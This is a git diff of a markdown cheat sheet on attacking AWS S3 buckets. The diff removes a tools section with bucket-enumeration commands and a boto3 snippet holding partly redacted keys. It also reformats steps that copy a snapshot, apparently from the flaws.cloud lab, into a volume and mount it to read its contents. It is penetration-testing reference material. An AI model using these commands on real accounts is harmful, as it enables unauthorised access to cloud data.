@@ -2,7 +2,6 @@
 
 ## Summary
 
-- [Tools](#tools)
 - [AWS Configuration](#aws-configuration)
 - [Open Bucket](#open-bucket)
 - [Basic tests](#basic-tests)
@@ -13,35 +12,6 @@
 - [AWS - Extract Backup](#aws---extract-backup)
 - [Bucket juicy data](#bucket-juicy-data)
 
-## Tools
-
-- [Pacu - The AWS exploitation framework, designed for testing the security of Amazon Web Services environments](https://github.com/RhinoSecurityLabs/pacu)
-- [Bucket Finder - Search for readable buckets and list all the files in them](https://digi.ninja/)
-	```powershell
-	wget https://digi.ninja/files/bucket_finder_1.1.tar.bz2 -O bucket_finder_1.1.tar.bz2
-	./bucket_finder.rb my_words
-	./bucket_finder.rb --region ie my_words
-		US Standard         = http://s3.amazonaws.com
-		Ireland             = http://s3-eu-west-1.amazonaws.com
-		Northern California = http://s3-us-west-1.amazonaws.com
-		Singapore           = http://s3-ap-southeast-1.amazonaws.com
-		Tokyo               = http://s3-ap-northeast-1.amazonaws.com
-
-	./bucket_finder.rb --download --region ie my_words
-	./bucket_finder.rb --log-file bucket.out my_words
-	```
-- [Boto3 - Amazon Web Services (AWS) SDK for Python](https://boto3.amazonaws.com/v1/documentation/api/latest/index.html)
-	```python
-	import boto3
-	# Create an S3 client
-	s3 = boto3.client('s3',aws_access_key_id='AKIAJQDP3RKREDACTED',aws_secret_access_key='igH8yFmmpMbnkcUaCqXJIRIozKVaREDACTED',region_name='us-west-1')
-
-	try:
-		result = s3.list_buckets()
-		print(result)
-	except Exception as e:
-		print(e)
-	```
 
 ## AWS Configuration
 
@@ -152,22 +122,24 @@ aws s3 ls s3://<bucketname> --recursive  | grep -v -E "(Bucket: |Prefix: |LastWr
 ## AWS - Extract Backup
 
 ```powershell
-aws --profile flaws sts get-caller-identity
+$ aws --profile flaws sts get-caller-identity
 "Account": "XXXX26262029",
 
-aws --profile flaws  ec2 describe-snapshots --owner-id XXXX26262029 --region us-west-2    
+
+$ aws --profile profile_name ec2 describe-snapshots
+$ aws --profile flaws  ec2 describe-snapshots --owner-id XXXX26262029 --region us-west-2    
 "SnapshotId": "snap-XXXX342abd1bdcb89",
 
 Create a volume using snapshot
-aws --profile swk ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-XXXX342abd1bdcb89
+$ aws --profile swk ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-XXXX342abd1bdcb89
 In Aws Console -> EC2 -> New Ubuntu
-chmod 400 YOUR_KEY.pem
-ssh -i YOUR_KEY.pem  ubuntu@ec2-XXX-XXX-XXX-XXX.us-east-2.compute.amazonaws.com
+$ chmod 400 YOUR_KEY.pem
+$ ssh -i YOUR_KEY.pem  ubuntu@ec2-XXX-XXX-XXX-XXX.us-east-2.compute.amazonaws.com
 
 Mount the volume
-lsblk
-sudo file -s /dev/xvda1
-sudo mount /dev/xvda1 /mnt
+$ lsblk
+$ sudo file -s /dev/xvda1
+$ sudo mount /dev/xvda1 /mnt
 ```
 
 ## Bucket juicy data
